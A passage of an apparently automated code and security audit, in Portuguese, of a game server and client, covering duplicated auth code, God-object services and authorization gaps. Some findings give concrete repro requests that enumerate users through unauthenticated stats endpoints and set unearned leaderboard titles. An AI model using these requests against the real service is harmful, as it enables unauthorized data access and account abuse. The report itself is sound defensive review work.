Nuances que impedem inflar alem de P2: (a) o SELECT projeta so 4 colunas pequenas (id/tier/division/lp), entao cada linha e ~dezenas de bytes e o custo por request e modesto ate a base ficar grande; (b) exige token valido no ramo do rank. Ainda assim e um cost/DoS-amplification legitimo (Regra 4: leitura quente sem limite + ordenacao que deveria ser do banco) e escala O(N) indefinidamente sem rate-limit. A JS-sort por tier e semi-justificada (tier e String ordenada por TIERS.indexOf, nao lexicografica) mas existe indice [tier,division,lp] e o rank poderia ser computado no banco. O ramo irmao getAllTimeLeaderboard com `limit` controlado pelo atacante e sem token e na pratica MAIS grave e reforca manter P2 (nao rebaixar pra P3). Confianca high do autor confirmada.

### [P2] Extracao/validacao de token JWT duplicada em 5 controllers apesar de existir optionalAuthMiddleware
- `src/server/src/controllers/achievement.controller.ts:13` · duplication-componentization · **CONFIRMED**
- **Evidência:** // achievement.controller.ts:13 (identico em history.controller.ts:13)
async function getUserFromToken(req: Request): Promise<string | null> {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) { return null; }
  const token = authHeader.split(' ')[1];
  const user = await authService.validateToken(token);
  return user?.id || null;
}

// bug.controller.ts:32-38 / leaderboard.controller.ts:26-31 e 54-60 (mesmo bloco inline)
  const authHeader = req.headers.authorization;
  if (authHeader?.startsWith('Bearer ')) {
    const token = authHeader.split(' ')[1];
    const user = await authService.validateToken(token);
    userId = user?.id;
  }

// middleware/auth.middleware.ts:86 JA EXISTE optionalAuthMiddleware que faz exatamente isso e popula req.user
- **Repro/verificação:** Duplicacao verbatim comprovada por leitura direta: getUserFromToken e byte-identico em achievement.controller.ts:13-22 e history.controller.ts:13-22; o mesmo bloco Bearer->split(' ')[1]->authService.validateToken aparece inline em bug.controller.ts:33-38, leaderboard.controller.ts:26-31 (getLeaderboard) e leaderboard.controller.ts:54-60 (getMyRank) = 5 copias. A abstracao ja existe (auth.middleware.ts: authMiddleware e optionalAuthMiddleware:86, este popula req.user fazendo exatamente isso), porem grep no repo inteiro mostra que NENHUMA das duas e referenciada em lugar algum: os route files (achievement/history/leaderboard/bug.routes.ts) montam os controllers sem middleware (router.get('/', ctrl)) e app.ts:97-121 registra esses routers direto -> abstracao virou dead code enquanto 5 copias fazem o trabalho na mao. DRIFT JA REAL, nao hipotetico: auth.controller.ts:16 extractToken aceita cookie httpOnly mysys_token como fonte de token (fallback para browser com credentials:'include'); as 5 copias so leem o header Bearer. Repro concreto: browser autenticado via cookie mysys_token (sem header Authorization) recebe 200 em GET /api/auth/me mas 401 em GET /api/history, GET /api/achievements e GET /api/leaderboard/me (getUserFromToken retorna null -> 'Nao autenticado'). A divergencia prevista pelo autor ('alguns vao ficar pra tras') ja esta materializada.
- **Notas do verificador:** Achado factualmente correto em todos os pontos materiais; unico reparo e a contagem ('6 copias' -> na verdade 5 sites distintos: 2 funcoes getUserFromToken + 3 blocos inline), diferenca imaterial. Correcao: montar optionalAuthMiddleware (auth optional) nas rotas leaderboard/bug e authMiddleware (auth obrigatoria) nas rotas achievement/history + getMyRank, e trocar a leitura por req.user; de quebra unifica a origem do token com extractToken (Bearer OU cookie), eliminando o drift. IMPORTANTE para quem for corrigir: e uma falha de manutenibilidade/consistencia que FALHA FECHADA (nega acesso, nao concede) -> NAO e bypass de auth nem vuln de seguranca; o efeito atual e usuario cookie-authed levando 401 indevido em history/achievements/leaderboard. P2 (duplication-componentization) do autor esta adequado: acima de trivial por causa do drift ja presente, mas nao P1 por nao haver exploit/escalonamento. Categoria correta = duplication-componentization, nao security.

### [P3] Rotas /api/stats/:userId e /api/stats/od/:odUserId sem autenticacao: IDOR de leitura + enumeracao de usuarios/odUserId
- `src/server/src/routes/stats.routes.ts:14` · authz-idor · **CONFIRMED**
- **Evidência:** router.get('/:userId', async (req, res) => { const { userId } = req.params; ... const statsResponse = await statsService.getUserStatsWithProgress(userId); res.json(statsResponse); }) e router.get('/od/:odUserId', ...). Montadas em app.ts:118 `app.use('/api/stats', statsRoutes)` SEM authMiddleware nem qualquer validacao de token/ownership dentro do handler.
- **Repro/verificação:** Broken access control provado no codigo: nenhum handler em stats.routes.ts checa token/ownership, e app.ts:118 monta `app.use('/api/stats', statsRoutes)` sem middleware. O authMiddleware definido em middleware/auth.middleware.ts e DEAD CODE — Grep por `authMiddleware|requireAuth` em todo src/server/src retorna SO a definicao (linha 23), zero usos. Repro sem token: 1) `GET /api/leaderboard` (nao autenticado, leaderboard.controller so usa token pra myRank opcional) -> devolve entries[].user_id (UUIDs validos publicos). 2) `GET /api/stats/<user_id>` -> HTTP 200 com stats completas de qualquer usuario (total_kills, total_deaths, total_damage_dealt, total_live_hits, best_win_streak, uso de itens, etc.) via statsService.getUserStatsWithProgress -> prisma.user.findUnique. 3) `GET /api/stats/od/<game_user_id>` -> 200 com `userId: user.id` interno + stats se aquele game_user_id (identidade compartilhada do Portal/Games-Admin, `@unique`) joga o jogo; 404 se nao -> oraculo de existencia/correlacao cross-game (game_user_id -> user.id -> username/display_name combinando com o leaderboard). O client (Achievements.tsx:59) so consulta o proprio game_user_id, confirmando que nao existe feature de perfil publico intencional — a ausencia de checagem de dono e gap real.
- **Notas do verificador:** Fato tecnico do achado (rota sem authMiddleware e sem verificacao de dono, alcancavel, IDOR-read + enumeracao/correlacao) esta 100% correto e reproduzivel apenas lendo o codigo — verdict CONFIRMED. Ajuste de severidade de P2 para P3: o autor exagerou. Fatores mitigantes: (a) somente leitura, sem write/mutacao; (b) dado de baixa sensibilidade (estatisticas de jogo) sem PII/segredo/credencial/financeiro; (c) grande parte ja e PUBLICA pelo proprio app via `GET /api/leaderboard` nao autenticado (user_id, username, display_name, avatar, games_played, games_won, win_rate, elo, total_xp). O incremento real de vazamento e: stats de combate granulares (kills/deaths/damage/uso de itens/streak) para QUALQUER usuario (nao so top-N) e a correlacao da identidade compartilhada do Portal (game_user_id -> user.id/username), que e o ponto mais relevante de privacidade no ecossistema. Ainda assim, impacto baixo -> P3. Correcao recomendada: aplicar authMiddleware (que ja existe e esta orfao) nas rotas de stats e restringir ao proprio usuario (ownership) para /:userId e /od/:odUserId, ou remover /od e derivar o odUserId de req.user. Observacao ecossistema: o MESMO padrao de authMiddleware orfao deixa leaderboard/history/achievements/bugs sem authz — vale auditar em conjunto, mas fora do escopo deste achado.

### [P3] authMiddleware/adminMiddleware definidos porem nunca montados; cada rota re-implementa auth, entao rotas novas sobem sem protecao (stats subiu)
- `src/server/src/middleware/auth.middleware.ts:23` · authz-idor · **CONFIRMED**
- **Evidência:** auth.middleware.ts exporta authMiddleware, adminMiddleware e optionalAuthMiddleware, mas o grep por importacoes de 'middleware/auth' em src/server/src NAO retorna nenhum match — nenhum router/app importa. app.ts monta todos os routers (auth/leaderboard/history/bugs/achievements/oauth/stats) sem middleware de auth; a protecao existe so porque cada controller chama getUserFromToken/validateToken manualmente.
- **Repro/verificação:** Todas as afirmacoes factuais batem com o codigo. (1) Grep "middleware/auth" em E:/Cursor/buckshotcopy/src/server/src => 0 matches: authMiddleware/adminMiddleware/optionalAuthMiddleware (auth.middleware.ts:23/59/86) sao exportados mas nunca importados. (2) app.ts:97-121 monta todos os routers (auth/leaderboard/history/bugs/achievements/oauth/stats) sem nenhum middleware de auth na cadeia; os unicos app.use globais sao CORS, security headers, cookie-parser e body-parsers. (3) Auth re-implementada por controller: history.controller.ts:13-22 e achievement.controller.ts:13-22 cada um define seu PROPRIO getUserFromToken() duplicado chamando authService.validateToken inline, com o check manual "if(!userId) return 401" repetido em cada handler. (4) O modo de falha previsto ja ocorreu: stats.routes.ts:14-56 liga GET /api/stats/:userId e /od/:odUserId direto ao statsService sem nenhum check de token -> subiu publica exatamente porque nao ha gate central. Nenhuma tentativa de refutacao sobreviveu: nao existe auth global montada em outro lugar (app.ts e a raiz de composicao e o grep e limpo).
- **Notas do verificador:** Achado factualmente correto e reproduzivel por leitura estatica (grep + rastreio da raiz de composicao). Ressalva: a categoria "authz-idor" encaixa melhor no achado SEPARADO de stats publico (dados por :userId), nao no dead-middleware em si. Isolado, este achado e dead-code + gap de defense-in-depth/manutenibilidade, NAO um IDOR diretamente exploravel por si so — por isso P3 (baixo) esta correto e nao deve ser inflado. O autor ja se auto-limita honestamente (reconhece que nao ha endpoints admin, logo adminMiddleware e inerte). Correcao natural: montar authMiddleware nos routers protegidos (history/achievements/leaderboard-me/bugs) e remover os getUserFromToken duplicados; decidir explicitamente se stats/leaderboard sao publicos por design.

### [P3] setActiveTitle sem verificação de posse — usuário exibe título não conquistado no leaderboard
- `src/server/src/services/achievement.service.ts:597` · authorization · **CONFIRMED**
- **Evidência:** // setActiveTitle grava active_title_id SEM checar se o user possui o título (user_titles):
  async setActiveTitle(userId: string, titleId: string | null): Promise<boolean> {
    try {
      await prisma.user.update({
        where: { id: userId },
        data: { active_title_id: titleId },
      });

// achievement.controller.ts:73 — titleId vem cru do corpo (PUT /api/achievements/title):
    const { titleId } = req.body;
    const success = await achievementService.setActiveTitle(userId, titleId || null);

// leaderboard.service.ts:118 — leaderboard devolve o campo cru, SEM validar posse:
      active_title_id: user.active_title_id,
- **Repro/verificação:** Precondicao: usuario autenticado comum com games_played > 0 (qualquer jogador real).

1. Obter Bearer token via login normal.
2. PUT /api/achievements/title  Headers: Authorization: Bearer <token>  Body: {"titleId":"title_champion"}
   -> achievement.controller.ts:73-74 le titleId cru do body (sem whitelist/checagem de posse) e chama setActiveTitle(userId, 'title_champion').
   -> achievement.service.ts:597 executa prisma.user.update({where:{id:userId}, data:{active_title_id:'title_champion'}}). Nenhuma consulta a user_titles. schema.prisma:59 active_title_id e String? SEM FK, entao qualquer string persiste; try/catch so retorna false em erro de DB (nao ocorre). Retorna 200 {success:true}.
3. GET /api/leaderboard?period=all_time -> leaderboard.service.ts:118 (e :195 nos periodos) retorna active_title_id: user.active_title_id CRU, sem validar posse.
4. Leaderboard.tsx:203-213 faz getTitleById('title_champion') -> resolve (achievements.ts:108) e renderiza "Campeao Supremo" + icone crown ao lado do nome.

Efeito: o jogador exibe no ranking um titulo (ex.: title_champion "Maior ELO rating", ou title_veteran "Lenda") que nunca conquistou. Prova da inconsistencia: getActiveTitle (service:615-620) VALIDA posse contra user_titles na leitura do proprio perfil (retorna null), mas o caminho de leitura do leaderboard nao aplica essa mesma validacao.
- **Notas do verificador:** Achado real e reproduzivel por analise estatica. Falha de autorizacao em dois pontos.

### [P3] God Object: RoomService (1227 LOC) acumula estado em memoria, event-bus por callbacks, timers, serializacao e rematch
- `src/server/src/services/game/room.service.ts:112` · pattern-oo · **CONFIRMED**
- **Evidência:** export class RoomService {
  private rooms: Map<string, Room> = new Map();
  // Rematch tracking: previousRoomCode -> newRoomCode
  private rematchRooms: Map<string, string> = new Map();

  // Callbacks para comunicacao com handlers
  onGameCancelled?: (...) => void;
  onPlayerWonByDefault?: (...) => void;
  ... (11 callbacks) ...
  onGameResumed?: (...) => void;
- **Repro/verificação:** Fato estrutural verificável diretamente no arquivo (não é bug de runtime; é smell de arquitetura, e ele EXISTE): src/server/src/services/game/room.service.ts tem 1227 LOC (exato, confirmado com wc -l) e uma única classe RoomService concentra: (a) fonte-da-verdade em memória via `private rooms: Map<string, Room>` (linha 113) + `rematchRooms` (115); (b) event-bus ad-hoc por callbacks opcionais — 10 props on* (linhas 118-127), NÃO 11; (c) timers setTimeout espalhados: emptyRoomTimeout (474, 715), grace WaitingRoom (589), checkReconnectTimeout (620), auto-cleanup rematch (1042); (d) serialização DTO serializeRoomState (1090) / restoreRoomFromState (1143); (e) rematch tracking (1019-1054); (f) todo o ciclo de reconexão (handleDisconnect 550, checkReconnectTimeout 634, checkWaitingRoomReconnect 683, reconnectPlayer 728, rejoinByUserId 798, removePlayerByUserId 881). ~28 métodos numa classe só. Isso prova o God Object descrito. PORÉM, parte do IMPACTO alegado é falsa (ver notes).
- **Notas do verificador:** O achado é real na sua espinha (classe grande, multi-responsabilidade, estado em memória), mas exagera e erra em pontos que reduzem a severidade de P2 para P3 (smell de manutenibilidade, sem defeito funcional, sem falha de segurança, sem comportamento incorreto reproduzível). Correções factuais: (1) São 10 callbacks, não 11 (linhas 118-127). (2) FALSO que a classe faça serialização/restauração "para o banco". RoomService importa SOMENTE shared/types e shared/constants — zero prisma/knex/redis/repository/query/INSERT/SELECT (os únicos matches de 'persistence'/'database' são comentários nas linhas 1083/1087). serializeRoomState/restoreRoomFromState são mapeadores DTO puros in-memory<->objeto-plano; o I/O de banco real está no serviço IRMÃO game.persistence.service.ts (36KB) e em index.ts (chama restoreRoomFromState na inicialização). Logo o impacto 'qualquer mudança em lifecycle arrisca quebrar persistência' está enfraquecido — a persistência JÁ é serviço separado. (3) 'Impossível testar regra de sala sem carregar timers/serialização' é exagero: createRoom/joinRoom/leaveRoom/startGame retornam objetos de resultado planos e são testáveis isoladamente; serialize/restore são independentes. (4) Regra 3 (fonte da verdade em DB/Redis) — o design in-memory-first é deliberado para servidor de jogo em tempo real e JÁ tem caminho de crash-recovery via DB (index.ts). 'Não-escalável horizontalmente' é traço real do design single-process, não um bug. Conclusão: sobrevive como candidato legítimo a refatoração (extrair ReconnectionManager, RematchRegistry e RoomSerializer da RoomService), mas em P3 e com a justificativa de acoplamento-a-DB corrigida, pois esse acoplamento não existe na classe.

### [P3] AchievementService (940 LOC): regras de jogo (badges/milestones/titulos) acopladas a Prisma e a SQL cru via $queryRawUnsafe com datas interpoladas
- `src/server/src/services/achievement.service.ts:841` · pattern-oo · **CONFIRMED**
- **Evidência:** const results = await prisma.$queryRawUnsafe<{ userId: string; score: number }[]>(query);
// query montada por string em recalculateTitles:
`SELECT le.user_id as userId, ... WHERE le.period = 'WEEKLY' AND le.period_start = '${this.formatDateForSQL(weekStart)}' ...`
// e checkMilestones intercala regra + escrita:
const conditions: Record<string, boolean> = { first_blood: user.total_kills >= 1, serial_killer: user.total_kills >= 10, ... };
- **Repro/verificação:** Pattern is present and directly verifiable in src/server/src/services/achievement.service.ts (941 LOC single class). (1) Milestone rules coupled to persistence: checkMilestones builds the inline threshold map `conditions` (lines 230-264, e.g. serial_killer: user.total_kills >= 10) and in the SAME method writes via prisma.userAchievement.create (line 271) after prisma.user.findUnique (199). (2) Titles: recalculateTitles composes SQL strings with interpolated dates `WHERE le.period = 'WEEKLY' AND le.period_start = '${this.formatDateForSQL(weekStart)}'` (697, 713, 729, 747, 763, 779, 794) and runs them via prisma.$queryRawUnsafe<...>(query) at awardPeriodTitle:849 and awardAllTimeTitle:888. Business rules (games_played>=5, elo_gain>0, status='COMPLETED') live inside the SQL text. (3) Reachable in prod: recalculateTitles is fire-and-forget from processGameEnd (line 182), invoked at room.handler.ts:202 and game.handler.ts:745 on game end. No repro of a runtime failure exists because there is none — this is a structural/maintainability finding, not a bug.
- **Notas do verificador:** Downgraded P2->P3. Two reasons the author over-graded: (a) No exploitable path — every value interpolated into the $queryRawUnsafe strings is formatDateForSQL(weekStart|weekEnd|monthStart|monthEnd), all internal `new Date(...)` derived from `now`; formatDateForSQL emits a fixed toISOString slice. No socket/user input reaches any query. The finding itself concedes injection risk is nil. (b) Factual error in the finding: it claims badge/milestone/title thresholds all require a real DB to test. computeBadges (376-502) has ZERO prisma calls (grep confirms prisma jumps from line 351 to 510) — it is a pure PlayerEndGameStats[]->MatchBadgeAwarded[] function, fully unit-testable in isolation. So the coupling/untestability argument holds only for checkMilestones and the title queries, not badges. Net: the God-Service + $queryRawUnsafe-with-interpolated-dates + inline-threshold coupling is genuinely present and a valid refactor target (parameterize with $queryRaw tag, split rule evaluation from persistence), but with no functional defect, no reachable injection, and an inflated testability claim, this is a low-severity code-quality smell, not medium.

### [P3] processShot mistura regra de jogo (dano/eliminacao/fim de round) com rastreamento de achievements no mesmo metodo
- `src/server/src/services/game/game.service.ts:374` · pattern-oo · **CONFIRMED**
- **Evidência:** // ========== TRACK STATS ==========
shooter.stats.shotsFired++; shooter.stats.shotsInCurrentRound++;
if (shell === 'live') { shooter.stats.liveHits++; shooter.stats.liveHitsInGame++; ... if (sawedOff) shooter.stats.sawedShots++; }
else { shooter.stats.allShotsLiveInGame = false; }
... shooter.stats.firstBloodInGame = true; ...
// ========== END TRACK STATS ==========
- **Repro/verificação:** Nao e bug de runtime (input->efeito); e observacao estrutural, e o codigo a prova verbatim. game.service.ts:336-467 processShot: apos calcular dano/aplicar hp (369-372), as linhas 374-421 entrelacam ~48 linhas de contadores de achievement (shotsFired/shotsInCurrentRound 375-376; live: liveHits/liveHitsInGame/damageDealt/selfDamage/sawedShots 378-395; blank: allShotsLiveInGame=false 398; morte: deaths/kills/killsInCurrentRound/firstBloodInGame 404-414) dentro da regra de morte/firstToDie/fim-de-round. Mesmo padrao: startRound (200-233 init de 30+ campos de stats inline + resets 237-239), checkRoundEnd:838-856 (deteccao de fim + killsPerRound/wonRoundWithZeroShots/roundsSurvivedAsLast), checkGameEnd:876-889 (fim de jogo + finalHp/lostEarlyRounds). Alcancavel: game.handler.ts:52 (tiro), :856 (auto-tiro), bot.service.ts:604 (bot). Nao ha lever de refutacao (authz/validacao/transacao/unreachable/dev-config) aplicavel a um smell de design, e a descricao e factualmente exata.
- **Notas do verificador:** Achado real mas de baixissimo valor: SRP/Regra 1 puramente de manutencao, sem impacto funcional/seguranca/correcao/perf. Mistura e idiomatica para game engine (stats precisam do contexto exato do momento: shell live, dano, kill, self) e extrair pra observer/emitter provavelmente aumenta complexidade. Ja existem banners // TRACK STATS delimitando a preocupacao, e ambos (regra + stats) sao testaveis numa unica chamada de processShot. Autor classificou P3 (piso da escala) com confianca medium — sem exagero; e borderline won't-fix/idiomatico. Mantido P3.

### [P3] getRankFromElo triplicado com thresholds DIVERGENTES (cliente x shared/servidor)
- `src/client/src/utils/helpers.ts:78` · duplication-componentization · **CONFIRMED**
- **Evidência:** // client/utils/helpers.ts:78
export const getRankFromElo = (elo: number): string => {
  if (elo >= 2500) return 'Grandmaster';
  if (elo >= 2200) return 'Master';
  if (elo >= 1900) return 'Diamond';
  if (elo >= 1600) return 'Platinum';
  if (elo >= 1300) return 'Gold';
  if (elo >= 1000) return 'Silver';
  return 'Bronze';
};

// shared/utils/eloCalculator.ts:355
export function getRankFromElo(elo: number): string {
  if (elo >= 2400) return 'Grandmaster';
  if (elo >= 2100) return 'Master';
  if (elo >= 1800) return 'Diamond'; ...

// server/services/auth.service.ts:410 (calculateRank, copia exata do shared)
  private calculateRank(elo: number): string {
    if (elo >= 2400) return 'Grandmaster';
    if (elo >= 2100) return 'Master'; ...
- **Repro/verificação:** A DUPLICAÇÃO é real e verificável nas linhas exatas: (1) client helpers.ts:78 getRankFromElo usa faixas 2500/2200/1900/1600/1300/1000; (2) shared/utils/eloCalculator.ts:355 getRankFromElo usa 2400/2100/1800/1500/1200/900; (3) server/src/services/auth.service.ts:410 calculateRank é cópia byte-a-byte da versão shared (2400/2100/...), embora o servidor JÁ importe o shared getRankFromElo em game.persistence.service.ts:11 e o use em :452 — logo calculateRank é duplicação redundante. Isso confirma o título/categoria (triplicação com thresholds divergentes). PORÉM o IMPACTO alegado ("front rank NÃO bate com back para bandas 900-1000, 1200-1300...") é REFUTADO: o getRankFromElo do CLIENTE tem ZERO call sites. `grep -rn "getRankFromElo(" src/client/src` retorna vazio; o símbolo só aparece como definição (helpers.ts:78) e re-export no barrel (utils/index.ts:12). A UI renderiza o valor PERSISTIDO do servidor: Header.tsx:129-131 e Profile.tsx:268-270 exibem `user.tier`; AnalyticsContext.tsx:75-76 lê user.tier/user.rank. O cliente nunca recalcula rank a partir do ELO, então a divergência de faixas nunca chega ao usuário — é código morto no cliente.
- **Notas do verificador:** Finding parcialmente correto: a triplicação existe de fato (3 cópias, uma delas — client — morta/nunca chamada; outra — auth.service.calculateRank — cópia byte-a-byte do shared que o próprio servidor já importa em outro lugar). É um code smell legítimo de fonte-única/port. Mas o autor exagerou a severidade justificando P2 com um bug funcional inexistente: como o getRankFromElo do cliente nunca é invocado (0 call sites) e a UI mostra o campo persistido user.tier/user.rank (vindo do servidor, thresholds 2400), a alegada divergência visível nas bandas de ELO NÃO ocorre. Reforço: o campo `rank` gravado via getRankFromElo está marcado como legacy no persistence.service.ts:450, e o badge principal da UI usa `user.tier` (sistema LP/MMR separado), não o rank derivado do ELO. Correção de severidade: P2->P3 (manutenção/dead code, sem impacto funcional, de segurança ou visível ao usuário). O risco é apenas latente: se alguém no futuro ligar a função do cliente para exibir rank, aí sim herdaria os thresholds divergentes. Recomendação de correção continua válida: eliminar as 3 cópias, manter única fonte no shared eloCalculator, remover auth.service.calculateRank (usar o import do shared) e remover/alinhar helpers.ts:78 do cliente.

### [P3] Mapper snake_case->camelCase de partida duplicado dentro do history.controller
- `src/server/src/controllers/history.controller.ts:45` · duplication-componentization · **CONFIRMED**
- **Evidência:** // getUserHistory (linha 45)
const formattedData = result.data.map(game => ({
  id: game.id, roomCode: game.room_code, status: game.status,
  createdAt: game.created_at?.toISOString() || null, endedAt: game.ended_at?.toISOString() || null,
  totalRounds: game.total_rounds, position: game.position, roundsWon: game.rounds_won,
  kills: game.kills, deaths: game.deaths, damageDealt: game.damage_dealt, damageTaken: game.damage_taken,
  selfDamage: game.self_damage, shotsFired: game.shots_fired, itemsUsed: game.items_used,
  eloChange: game.elo_change, lpChange: game.lp_change, xpEarned: game.xp_earned, ...

// getGameDetails (linha 130) - mesmos ~18 campos remapeados + participants.map com os mesmos campos por jogador
const formattedDetails = {
  id: details.id, roomCode: details.room_code, status: details.status,
  createdAt: details.created_at?.toISOString() || null, ... totalRounds, position, roundsWon,
  kills, deaths, damageDealt, damageTaken, selfDamage, shotsFired, itemsUsed, eloChange, lpChange, xpEarned ...
- **Repro/verificação:** Duplicacao literal comprovada por inspecao em src/server/src/controllers/history.controller.ts. O bloco de 18 campos snake->camel aparece IDENTICO (mesma ordem, mesmo `?.toISOString() || null` nas datas) em duas funcoes: getUserHistory linhas 46-63 e getGameDetails linhas 131-148 — id, roomCode, status, createdAt, endedAt, totalRounds, position, roundsWon, kills, deaths, damageDealt, damageTaken, selfDamage, shotsFired, itemsUsed, eloChange, lpChange, xpEarned. Terceira copia parcial (11 dos mesmos campos de stat) em participants.map linhas 153-169. Nao existe helper compartilhado: grep por roomCode|damageDealt|eloChange|toCamelCase|formatGame so retorna history.controller.ts e history.service.ts. Rotas ao vivo em history.routes.ts (GET / e GET /:gameId), nao e codigo de teste. Hazard real e nao pego pelo compilador: res.json() com object literal nao acusa propriedade FALTANDO, entao adicionar um campo em GameHistoryEntry e esquecer um dos blocos camelCase derruba o campo silenciosamente da resposta desse endpoint.
- **Notas do verificador:** Achado e real e ate SUBESTIMADO: alem dos 2 blocos camelCase no controller + participants.map, o service (history.service.ts) tambem materializa a mesma lista de campos 2x em snake_case (linhas 188-209 e 330-353) e duplica a derivacao de opponents/winner verbatim (166-186 vs 278-298) — a lista de campos existe ~4x nos dois arquivos. Refutacao impossivel: nao ha guarda/authz/policy aplicavel a um achado de duplicacao, e nao ha abstracao compartilhada que o autor tenha deixado passar. Correcao natural: extrair um formatGameStats(entry) que faz o spread dos 18 campos camelCase e reusar nos dois endpoints. Rebaixei P2->P3 porque e cleanup puro de camada de apresentacao, sem bug funcional nem impacto de seguranca hoje, raio de acao localizado num modulo; TS mitiga parcialmente (nao totalmente) o risco. Prioridade baixa, nao media.

### [P3] Logica de fetch do changelog copy-paste entre Changelog e ChangelogPage
- `src/client/src/components/home/Changelog/Changelog.tsx:30` · duplication-componentization · **CONFIRMED**
- **Evidência:** // Changelog.tsx:30 e ChangelogPage.tsx:29 - corpo quase identico, so muda ?limit=3 vs ?limit=20
const fetchChangelog = async () => {
  if (!ADMIN_API_URL) { setError('API nao configurada'); setLoading(false); return; }
  try {
    const response = await fetch(`${ADMIN_API_URL}/api/games/${GAME_CODE}/changelog?limit=3`);
    const data = await response.json();
    if (!response.ok) { setError(data.error || 'Erro ao carregar changelog'); setLoading(false); return; }
    if (!data.entries || data.entries.length === 0) { setError('Nenhuma atualizacao disponivel'); setLoading(false); return; }
    setEntries(data.entries);
  } catch (err) { console.error('Error fetching changelog:', err); setError('Erro ao conectar com o servidor'); }
  finally { setLoading(false); }
};
- **Repro/verificação:** Diff textual direto entre os dois arquivos prova a duplicacao, nao precisa executar nada:

Changelog.tsx:30-60 (home widget):
  const fetchChangelog = async () => {
    if (!ADMIN_API_URL) { setError('API nao configurada'); setLoading(false); return; }
    try {
      const response = await fetch(`${ADMIN_API_URL}/api/games/${GAME_CODE}/changelog?limit=3`);
      const data = await response.json();
      if (!response.ok) { setError(data.error || 'Erro ao carregar changelog'); setLoading(false); return; }
      if (!data.entries || data.entries.length === 0) { setError('Nenhuma atualizacao disponivel'); setLoading(false); return; }
      setEntries(data.entries);
    } catch (err) { console.error('Error fetching changelog:', err); setError('Erro ao conectar com o servidor'); }
    finally { setLoading(false); }
  };

ChangelogPage.tsx:29-59 (pagina cheia): CORPO BYTE-A-BYTE IDENTICO, unica diferenca `?limit=20` no lugar de `?limit=3`.

A duplicacao vai alem da funcao: ambos repetem tambem (a) a interface `ChangelogEntry` (Changelog.tsx:10-16 vs ChangelogPage.tsx:12-18), (b) o trio de estado `useState<ChangelogEntry[]>([])` + `useState(true)` + `useState<string|null>(null)`, (c) o `useEffect(() => { fetchChangelog(); }, [])`, e (d) o handler de retry identico `onClick={() => { setLoading(true); setError(null); fetchChangelog(); }}` (Changelog.tsx:85 vs ChangelogPage.tsx:84). Grep confirma que NAO existe hook compartilhado (nenhum `useChangelog`), entao a maquina de estados esta genuinamente copy-pasted entre os dois sitios de chamada.
- **Notas do verificador:** Achado real e verificavel por texto (nao ha guarda/authz/config-de-dev que refute — e um smell de DRY, nao seguranca). O caminho e alcancavel: Changelog e renderizado na home e ChangelogPage na rota /changelog (ver App.tsx/Lobby.tsx). Correcao natural: extrair um hook `useChangelog(limit: number)` retornando { entries, loading, error, refetch } e consumi-lo nos dois componentes; de quebra, unificar tambem a interface `ChangelogEntry`. Uma nuance que o autor nao mencionou e que ate a origem das constantes diverge (Changelog.tsx le `import.meta.env` inline nas linhas 18-19 enquanto ChangelogPage importa `GAME_CODE, ADMIN_API_URL` de '../../config') — mais uma inconsistencia a alinhar na extracao. Ajustei a severidade P2 -> P3: e duplicacao contida (exatamente 2 call sites, ~30 linhas), sem impacto de runtime/correcao/seguranca; e puro custo de manutencao. P2 e defensavel mas exagera levemente por se tratar de uma maquina de estados inteira replicada; P3 e a nota honesta pra 'componentization' sem bug associado. Confianca high mantida.

### [P3] Linha de leaderboard e avatar-com-fallback duplicados entre Leaderboard e MiniLeaderboard (e mais 2 telas)
- `src/client/src/pages/Leaderboard/Leaderboard.tsx:189` · duplication-componentization · **CONFIRMED**
- **Evidência:** // Leaderboard.tsx:189
<div className="entry-avatar">
  {entry.avatar_url ? (<img src={entry.avatar_url} alt={entry.display_name} />) : (entry.display_name.charAt(0).toUpperCase())}
</div>

// MiniLeaderboard.tsx:82 (mesmo padrao + interface LeaderboardEntry redefinida + fetch /api/leaderboard duplicado)
<div className="leaderboard-entry__avatar">
  {player.avatar_url ? (<img src={player.avatar_url} alt={player.display_name || 'Jogador'} />) : (<span>{(player.display_name || '?').charAt(0).toUpperCase()}</span>)}
</div>

// mesmo fallback de inicial em WaitingRoom.tsx:297 e PlayerCard.tsx:43
- **Repro/verificação:** Duplicacao real e verificavel diretamente no codigo (nao e bug de runtime — e maintainability):

1) Interface LeaderboardEntry redefinida em 2 arquivos:
   - Leaderboard.tsx:27-45 (13 campos: username, games_played, games_won, win_rate, elo_rating, total_xp, active_title_id, tier/division/lp opcionais...)
   - MiniLeaderboard.tsx:11-21 (9 campos, com tier/division/lp/displayRank OBRIGATORIOS). Mesmo nome, shapes divergentes.

2) Fetch de /api/leaderboard duplicado, cada um com seu useEffect/useState/loading:
   - Leaderboard.tsx:66  fetch(`/api/leaderboard?period=${period}`)
   - MiniLeaderboard.tsx:31  fetch('/api/leaderboard?period=all_time&limit=10')

3) Bloco avatar-com-inicial-de-fallback duplicado E JA DIVERGENTE entre os dois:
   - Leaderboard.tsx:189-195 -> fallback como TEXTO SOLTO: entry.display_name.charAt(0).toUpperCase(), classe entry-avatar
   - MiniLeaderboard.tsx:81-87 -> fallback em <span>, com guarda (player.display_name || '?'), classe BEM leaderboard-entry__avatar
   Ou seja, a mesma linha de ranking (rank+avatar+nome+elo) renderizada com duas convencoes de classe diferentes (entry-* vs leaderboard-entry__*).

Prova de que refuta a inflacao de escopo (verifiquei via Grep): PlayerCard.tsx e WaitingRoom.tsx NAO tem nenhuma referencia a avatar_url (0 matches). WaitingRoom.tsx:297 = `isBot ? 'AI' : player.name.charAt(0).toUpperCase()` e PlayerCard.tsx:43 = `player.name.charAt(0).toUpperCase()` — sem ramo de <img>, operando num tipo Player que nao tem avatar_url. Portanto o BLOCO avatar-com-imagem-e-fallback existe em 2 arquivos, nao 4; os outros 2 so compartilham o idiom charAt(0).toUpperCase() para outro dominio de dados (sem suporte a imagem).
